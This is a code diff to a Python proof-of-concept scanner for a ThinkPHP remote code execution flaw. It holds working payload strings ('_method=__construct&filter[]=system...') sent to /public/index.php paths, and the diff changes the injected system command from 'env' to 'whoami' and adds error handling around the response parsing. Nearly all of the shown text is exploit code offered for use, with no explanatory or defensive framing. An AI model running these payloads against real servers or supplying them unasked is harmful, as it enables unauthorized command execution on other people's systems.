@@ -42,13 +42,16 @@ def Poc(host,exp):
         else:
             content = rep.text.replace("\n", "")
 
-            s = re.findall(r'<div class="echo">(.*?)</div>',content)[0].strip()
-            if len(s)==0:
-                continue
-            else:
-                exploit['url']=url
-                exploit['exp']=data
-                break
+            try:
+                s = re.findall(r'<div class="echo">(.*?)</div>',content)[0].strip()
+                if len(s)==0:
+                    continue
+                else:
+                    exploit['url']=url
+                    exploit['exp']=data
+                    break
+            except Exception as e:
+                pass
 
     if len(exploit)==0:
         print("[-]%s 不存在该漏洞" %host)
@@ -69,8 +72,8 @@ def Poc(host,exp):
 
 
 if __name__=="__main__":
-    exp1="_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=env"
-    exp2="s=env&_method=__construct&method=&filter[]=system"
+    exp1="_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami"
+    exp2="s=whoami&_method=__construct&method=&filter[]=system"
     exp={
         '/public/index.php?s=captcha':exp1,
         '/public/index.php?s=index/index/index':exp2
